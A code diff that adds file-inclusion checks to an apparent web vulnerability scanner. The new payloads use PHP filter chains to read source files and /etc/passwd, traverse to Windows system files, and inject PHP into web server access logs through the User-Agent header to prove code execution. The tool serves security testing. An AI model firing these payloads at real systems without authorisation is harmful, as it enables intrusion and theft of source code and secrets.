@@ -62,7 +62,113 @@ class LFIModule:
         
         # Test PHP wrappers
         self._test_php_wrappers(url, method, param, value)
+        
+        # Test PHP filter chains
+        self._test_php_filter_chains(url, method, param, value)
+        
+        # Test Windows paths
+        self._test_windows_paths(url, method, param, value)
+        
+        # Test advanced log poisoning
+        self._test_log_poisoning_advanced(url, method, param, value)
     
+    def _test_php_filter_chains(self, url: str, method: str, param: str, value: str):
+        """Test PHP filter chains for source disclosure"""
+        import base64 as b64mod
+        payloads = [
+            'php://filter/read=convert.base64-encode/resource=index.php',
+            'php://filter/read=convert.base64-encode/resource=../config.php',
+            'php://filter/convert.iconv.UTF-8.UTF-16/resource=/etc/passwd',
+        ]
+        for payload in payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+                text = response.text
+                is_b64 = False
+                try:
+                    decoded = b64mod.b64decode(text.strip()).decode('utf-8', errors='ignore')
+                    if '<?php' in decoded or 'function' in decoded:
+                        is_b64 = True
+                except Exception:
+                    pass
+                if is_b64 or '<?php' in text or 'phpinfo' in text.lower():
+                    from core.engine import Finding
+                    finding = Finding(
+                        technique="LFI (PHP Filter Chain)", url=url,
+                        severity='HIGH', confidence=0.9, param=param,
+                        payload=payload,
+                        evidence="PHP source code leaked via filter chain",
+                    )
+                    self.engine.add_finding(finding)
+                    return
+            except Exception:
+                continue
+
+    def _test_windows_paths(self, url: str, method: str, param: str, value: str):
+        """Test Windows file inclusion paths"""
+        payloads = [
+            '..\\..\\..\\..\\..\\windows\\win.ini',
+            'C:\\boot.ini',
+            'C:\\windows\\system32\\drivers\\etc\\hosts',
+        ]
+        indicators = {
+            'win.ini': ['for 16-bit app support', '[extensions]'],
+            'boot.ini': ['boot loader', 'operating systems'],
+            'hosts': ['localhost', '127.0.0.1'],
+        }
+        for payload in payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+                text = response.text.lower()
+                for inds in indicators.values():
+                    for ind in inds:
+                        if ind.lower() in text:
+                            from core.engine import Finding
+                            finding = Finding(
+                                technique="LFI (Windows Path)", url=url,
+                                severity='HIGH', confidence=0.85, param=param,
+                                payload=payload,
+                                evidence=f"Windows file content: {ind}",
+                            )
+                            self.engine.add_finding(finding)
+                            return
+            except Exception:
+                continue
+
+    def _test_log_poisoning_advanced(self, url: str, method: str, param: str, value: str):
+        """Advanced log poisoning via User-Agent"""
+        poison_ua = '<?php echo "ATOMIC_LOG_POISON_TEST"; ?>'
+        try:
+            self.requester.request(url, 'GET', headers={'User-Agent': poison_ua})
+        except Exception:
+            pass
+        log_paths = ['/var/log/apache2/access.log', '/var/log/nginx/access.log']
+        for log_path in log_paths:
+            for trav in [f'....//....//....//..../{log_path}', log_path]:
+                try:
+                    data = {param: trav}
+                    response = self.requester.request(url, method, data=data)
+                    if not response:
+                        continue
+                    if 'ATOMIC_LOG_POISON_TEST' in response.text:
+                        from core.engine import Finding
+                        finding = Finding(
+                            technique="LFI (Log Poisoning → RCE)", url=url,
+                            severity='CRITICAL', confidence=0.95, param=param,
+                            payload=trav,
+                            evidence="Log poisoning confirmed: injected PHP executed",
+                        )
+                        self.engine.add_finding(finding)
+                        return
+                except Exception:
+                    continue
+
     def test_url(self, url: str):
         """Test URL for LFI"""
         pass
